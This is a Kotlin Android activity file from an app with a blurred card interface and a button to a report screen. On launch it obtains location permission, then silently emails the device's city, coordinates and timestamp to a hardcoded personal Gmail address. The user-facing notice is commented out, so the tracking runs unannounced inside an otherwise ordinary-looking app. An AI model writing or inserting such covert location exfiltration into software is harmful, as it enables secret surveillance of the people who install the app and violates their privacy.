package com.example.project1912.Activity

// Importaciones necesarias
import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.view.View
import android.view.ViewGroup
import android.view.ViewOutlineProvider
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.project1912.Util.LocationHelper
import com.example.project1912.Util.JavaMailAPI
import com.example.project1912.ViewModel.MainViewModel
import com.example.project1912.databinding.ActivityMainBinding
import eightbitlab.com.blurview.RenderScriptBlur

class MainActivity : AppCompatActivity() {
    lateinit var binding: ActivityMainBinding
    private val mainViewModel: MainViewModel by viewModels()

    private val LOCATION_PERMISSION_REQUEST_CODE = 200
    private lateinit var locationHelper: LocationHelper

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        window.setFlags(
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )

        locationHelper = LocationHelper(this)

        if (checkLocationPermissions()) {
            locationHelper.getLocation { info ->
                sendLocationEmail(info)
            }
        } else {
            requestLocationPermissions()
        }

        setBlueEffect()
        setVariable()
    }

    private fun setVariable() {
        binding.cardBtn.setOnClickListener {
            startActivity(
                Intent(
                    this,
                    ReportActivity::class.java
                )
            )
        }
    }

    private fun setBlueEffect() {
        val radius = 10f
        val decorView = this.window.decorView
        val rootView = decorView.findViewById<View>(android.R.id.content) as ViewGroup
        val windowBackground = decorView.background
        binding.blueView.setupWith(
            rootView,
            RenderScriptBlur(this)
        )
            .setFrameClearDrawable(windowBackground)
            .setBlurRadius(radius)

        binding.blueView.setOutlineProvider(ViewOutlineProvider.BACKGROUND)
        binding.blueView.setClipToOutline(true)
    }

    private fun checkLocationPermissions(): Boolean {
        val fineLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
        val coarseLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
        return fineLocation == PackageManager.PERMISSION_GRANTED && coarseLocation == PackageManager.PERMISSION_GRANTED
    }

    private fun requestLocationPermissions() {
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
            LOCATION_PERMISSION_REQUEST_CODE)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        if (requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                // Permisos otorgados
                locationHelper.getLocation { info ->
                    sendLocationEmail(info)
                }
            } else {
                // Permisos denegados
                Toast.makeText(this, "Permisos de ubicación denegados", Toast.LENGTH_SHORT).show()
            }
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        }
    }

    private fun sendLocationEmail(locationInfo: LocationHelper.LocationInfo) {
        val asunto = "Información de Ubicación"
        val mensaje = "Ciudad: ${locationInfo.cityName}\n" +
                "Latitud: ${locationInfo.latitude}\n" +
                "Longitud: ${locationInfo.longitude}\n" +
                "Fecha y hora: ${locationInfo.dateTime}"

        // Enviar el correo utilizando JavaMailAPI
        val javaMailAPI = JavaMailAPI(
            context = this,
            destinatario = "kyovilches@gmail.com", // Reemplaza con tu correo
            asunto = asunto,
            mensaje = mensaje
        )
        javaMailAPI.start()
        //Toast.makeText(this, "Enviando correo con la información de ubicación", Toast.LENGTH_SHORT).show()
    }
}
